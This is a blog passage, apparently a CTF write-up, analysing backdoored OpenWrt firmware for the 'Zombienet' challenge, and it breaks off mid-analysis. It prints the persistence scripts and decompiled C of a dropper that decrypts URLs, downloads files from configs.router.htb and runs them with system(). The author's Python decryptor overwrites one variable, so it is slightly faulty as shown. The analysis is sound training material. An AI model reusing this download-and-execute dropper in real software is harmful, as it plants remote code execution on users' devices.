<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>HTB University CTF Writeups :: Av&#39;s Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Writeups for HTB Universtiy CTF 2023" />
<meta name="keywords" content="Forensics, Reversing, RC4, Malware" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="http://localhost:1313/posts/htb-university-ctf-writeups/" />






  
  
  
  
  
  <link rel="stylesheet" href="http://localhost:1313/styles.css">







  <link rel="shortcut icon" href="http://localhost:1313/img/theme-colors/red.png">
  <link rel="apple-touch-icon" href="http://localhost:1313/img/theme-colors/red.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="https://twitter.com/0xAtharv" />
  
    <meta name="twitter:creator" content="0xAtharv" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HTB University CTF Writeups">
<meta property="og:description" content="Writeups for HTB Universtiy CTF 2023" />
<meta property="og:url" content="http://localhost:1313/posts/htb-university-ctf-writeups/" />
<meta property="og:site_name" content="Av&#39;s Blog" />

  
  
  <meta property="og:image" content="http://localhost:1313/">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2024-01-02 12:52:48 &#43;0530 IST" />












</head>
<body class="red">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Av&#39;s Blog
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/posts">Posts</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="/posts" >Posts</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="http://localhost:1313/posts/htb-university-ctf-writeups/">HTB University CTF Writeups</a>
  </h1>
  <div class="post-meta"><time class="post-date">2024-01-02</time><span class="post-author">0xAtharv</span><span class="post-reading-time">13 min read (2604 words)</span></div>

  
    <span class="post-tags">
      
      #<a href="http://localhost:1313/tags/forensics/">Forensics</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/reversing/">Reversing</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/rc4/">RC4</a>&nbsp;
      
      #<a href="http://localhost:1313/tags/malware/">Malware</a>&nbsp;
      
    </span>
  
  


  
    <div class="table-of-contents">
      <h2>
        Table of Contents
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#zombienet-medium-difficulty-forensics">Zombienet (Medium Difficulty Forensics)</a></li>
    <li><a href="#biobundle-medium-difficulty-reversing-challenge">BioBundle (Medium Difficulty Reversing Challenge)</a></li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <h2 id="zombienet-medium-difficulty-forensics">Zombienet (Medium Difficulty Forensics)<a href="#zombienet-medium-difficulty-forensics" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>This is the medium forensics challenge.
We are provided with a forensics_zombienet.zip which contains a file named <code>openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</code>.</p>
<p>running file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin
</span></span><span style="display:flex;"><span>openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin: u-boot legacy uImage, MIPS OpenWrt Linux-5.15.137, Linux/MIPS, OS Kernel Image <span style="color:#f92672">(</span>Not compressed<span style="color:#f92672">)</span>, <span style="color:#ae81ff">2847980</span> bytes, Tue Nov <span style="color:#ae81ff">14</span> 13:38:11 2023, Load Address: 0X80001000, Entry Point: 0X80001000, Header CRC: 0X8AF857A2, Data CRC: 0XB8874DDF
</span></span></code></pre></div><p>we can can guess it probably contains a squashfs image &hellip; what is  <a href="https://en.wikipedia.org/wiki/SquashFS">Squashfs</a>?</p>
<p>wiki:</p>
<p><em>Squashfs is a compressed read-only file system for Linux. Squashfs compresses files,
inodes and directories,and supports block sizes from 4 KiB up to 1 MiB for greater compression.</em></p>
<p>we can user binwalk to extract it :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk -e openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin
</span></span></code></pre></div><p>output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>forensics_zombienet.zip
</span></span><span style="display:flex;"><span>openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin
</span></span><span style="display:flex;"><span>_openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin.extracted
</span></span></code></pre></div><p>looking inside <code>_openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin.extracted</code> it has a squashfs-root directory , looking insied  we can see it looks like the standard linux box but there&rsquo;s a catch if we look at the bin directory of the squashfs we can see all the binaries are mips32 mips is a risc architecure (Reduced Instrcution Set Computer Instruction Set Architecture)</p>
<p>output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file busybox
</span></span><span style="display:flex;"><span>busybox: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib/ld-musl-mipsel-sf.so.1, no section header
</span></span></code></pre></div><p>since there are so many files to look at and I was too lazy i just ran</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -Rl <span style="color:#e6db74">&#34;Zombie&#34;</span> ./ 
</span></span></code></pre></div><p>at the root of squashfs i found these:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep -Rl <span style="color:#e6db74">&#34;zombie&#34;</span> ./
</span></span><span style="display:flex;"><span>./etc/init.d/dead-reanimation
</span></span><span style="display:flex;"><span>./etc/rc.d/S95dead-reanimation
</span></span><span style="display:flex;"><span>./usr/lib/opkg/info/dead-reanimation.list
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> cat ./usr/lib/opkg/info/dead-reanimation.list
</span></span><span style="display:flex;"><span>/etc/rc.d/S95dead-reanimation
</span></span><span style="display:flex;"><span>/etc/init.d/dead-reanimation
</span></span><span style="display:flex;"><span>/sbin/zombie_runner
</span></span><span style="display:flex;"><span>/usr/bin/dead-reanimation
</span></span></code></pre></div><p>by looking at the last 2 files we can see we have <code>/sbin/zombie_runner</code> and <code>/usr/bin/dead-reanimation</code> looking at these files :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat ./sbin/zombie_runner
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    /usr/bin/dead-reanimation
</span></span><span style="display:flex;"><span>    sleep <span style="color:#ae81ff">600</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>we can see it basically just runs  <code>/usr/bin/dead-reanimation</code>.
/usr/bin/dead-reanimation is a binary file so looking at it in ghidra.</p>
<p>I cleaned up only the relevant parts of the code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined4 local_a8;
</span></span><span style="display:flex;"><span>  undefined4 uStack_a4;
</span></span><span style="display:flex;"><span>  undefined4 uStack_a0;
</span></span><span style="display:flex;"><span>  undefined4 uStack_9c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_98;
</span></span><span style="display:flex;"><span>  undefined uStack_94;
</span></span><span style="display:flex;"><span>  undefined4 uStack_90;
</span></span><span style="display:flex;"><span>  undefined4 uStack_8c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_88;
</span></span><span style="display:flex;"><span>  undefined4 uStack_84;
</span></span><span style="display:flex;"><span>  undefined2 local_80;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> enc1 [<span style="color:#ae81ff">60</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> enc2 [<span style="color:#ae81ff">56</span>];
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_a8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9a6f65f0</span>;
</span></span><span style="display:flex;"><span>  uStack_a4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xadf4e47e</span>;
</span></span><span style="display:flex;"><span>  uStack_a0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4e937069</span>;
</span></span><span style="display:flex;"><span>  uStack_9c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8ec5e155</span>;
</span></span><span style="display:flex;"><span>  uStack_98 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3af55fc1</span>;
</span></span><span style="display:flex;"><span>  uStack_94 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  uStack_90 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9a6f65f0</span>;
</span></span><span style="display:flex;"><span>  uStack_8c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xadf4f27e</span>;
</span></span><span style="display:flex;"><span>  uStack_88 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4a8c4663</span>;
</span></span><span style="display:flex;"><span>  uStack_84 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9082ea40</span>;
</span></span><span style="display:flex;"><span>  local_80 <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(enc1,<span style="color:#f92672">&amp;</span>DAT_00400f74,<span style="color:#ae81ff">0x3a</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(enc2,<span style="color:#f92672">&amp;</span>DAT_00400fb0,<span style="color:#ae81ff">0x37</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decrypt1</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decrypt1</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>uStack_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decrypt1</span>(enc1);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decrypt1</span>(enc2);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">get_file</span>(enc1,<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>uStack_90,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">get_file</span>(enc2,<span style="color:#f92672">&amp;</span>uStack_90);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>uStack_90,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>uStack_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>looking at the memcpy() and decrpypt1() calls
we see</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(enc1,<span style="color:#f92672">&amp;</span>DAT_00400f74,<span style="color:#ae81ff">0x3a</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(enc2,<span style="color:#f92672">&amp;</span>DAT_00400fb0,<span style="color:#ae81ff">0x37</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decrypt1</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decrypt1</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>uStack_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decrypt1</span>(enc1);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">decrypt1</span>(enc2);
</span></span></code></pre></div><p>we memcpy some statically allocated variable into some stack variables and also decrypt some variables which are on the stack.</p>
<p>looking at the decrypt1() function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decrypt1</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
</span></span><span style="display:flex;"><span>  uint i;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_1), i <span style="color:#f92672">&lt;</span> sVar2; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x8000001f</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)uVar1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> (uVar1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xffffffe0</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    param_1[i] <span style="color:#f92672">=</span> param_1[i] <span style="color:#f92672">^</span> (<span style="color:#f92672">&amp;</span>DAT_00400f24)[uVar1];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>so looking at this function we can definitely see this is some sort of decryption function because we are performing certain operation for all the elements of param1. we can also see we use another statically allocaterd cariable <code>DAT_00400f24</code> this is our key.</p>
<p>lets worry about the decrypt function later and lets go back to the flow of the program .</p>
<p>we see after decrypting strings we check the <em>local_a8</em> if that file  exists  if it doesnt we call the get_file function which we pass the url stored in enc1 it does same for the other file &hellip;&hellip;</p>
<p>the get_file function downloads the file the enc1 and enc2 urls using libcurl . After doing that it just executes these files.</p>
<p>so lets try to decrpyt these urls.</p>
<p>looking again at the decrypt1() function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decrypt1</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
</span></span><span style="display:flex;"><span>  uint i;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_1), i <span style="color:#f92672">&lt;</span> sVar2; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x8000001f</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)uVar1 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> (uVar1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xffffffe0</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    param_1[i] <span style="color:#f92672">=</span> param_1[i] <span style="color:#f92672">^</span> (<span style="color:#f92672">&amp;</span>DAT_00400f24)[uVar1];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>i decided to reimplement the decryption function in python and use it obtain the necessay urls.</p>
<p><strong>my python script</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e">#using pwntools to get the elf address and read from it </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./dead-reanimation&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(a): <span style="color:#75715e"># i just reimplemented what the function looked like in ghidra</span>
</span></span><span style="display:flex;"><span>    temp<span style="color:#f92672">=</span>[]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(a)):
</span></span><span style="display:flex;"><span>        idx <span style="color:#f92672">=</span> i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">31</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(idx<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>            idx <span style="color:#f92672">=</span> (idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xffffffe0</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            print(idx)
</span></span><span style="display:flex;"><span>        temp<span style="color:#f92672">.</span>append(a[i]<span style="color:#f92672">^</span>key[idx])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> temp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0x0400f24</span>,<span style="color:#ae81ff">0x22</span>) <span style="color:#75715e"># reading the key from the elf </span>
</span></span><span style="display:flex;"><span>print(len(key))
</span></span><span style="display:flex;"><span>enc1  <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0x0400f74</span>,<span style="color:#ae81ff">0x3a</span>) <span style="color:#75715e"># reading enc1</span>
</span></span><span style="display:flex;"><span>enc1  <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0x0400fb0</span>,<span style="color:#ae81ff">0x37</span>) <span style="color:#75715e"># reading enc2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># just using ghidra output to build these array manually they are pretty useless for us anyways you will see.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># i probably didnt take endianess into account while reading the c and d arrays but i didnt waste too much time on them because i got the necessary urls </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>c<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x9a</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xad</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x7e</span>,<span style="color:#ae81ff">0x4e</span>,<span style="color:#ae81ff">0x93</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0xe1</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0x3a</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x0</span>] 
</span></span><span style="display:flex;"><span>d<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x9a</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xad</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0xf2</span>,<span style="color:#ae81ff">0x7e</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0x8c</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0xea</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0xc8</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>decrypt(enc1)
</span></span><span style="display:flex;"><span>q<span style="color:#f92672">=</span>decrypt(enc2)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">=</span>decrypt(c)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>decrypt(d)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;a=&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> p))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;b=&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> q))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;c=&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> r))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> d:
</span></span><span style="display:flex;"><span>    print(chr(i),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span></code></pre></div><p>output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/for
</span></span><span style="display:flex;"><span>$ python3 solve.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not populate MIPS GOT: seek out of range
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Did not find any GOT entries
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/av/ctf/htb-university-ctf/for/dead-reanimation&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     mips-32-little
</span></span><span style="display:flex;"><span>    RELRO:    No RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span>
</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span>http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00î
</span></span><span style="display:flex;"><span>b<span style="color:#f92672">=</span>http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00¤
</span></span><span style="display:flex;"><span>c<span style="color:#f92672">=</span>E~g<span style="color:#ae81ff">\x</span>1aütu²C¼BºJM¶ÞÏ<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">03</span>
</span></span><span style="display:flex;"><span>oeð­ôò~JFcê@È
</span></span><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/for
</span></span><span style="display:flex;"><span>$
</span></span></code></pre></div><p>Nice ! so we got our urls we can now use wget and look at these files .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>av@tokyo:~/ctf/htb-university-ctf/for/configs
</span></span><span style="display:flex;"><span>$ cat reanimate.sh
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
</span></span><span style="display:flex;"><span>
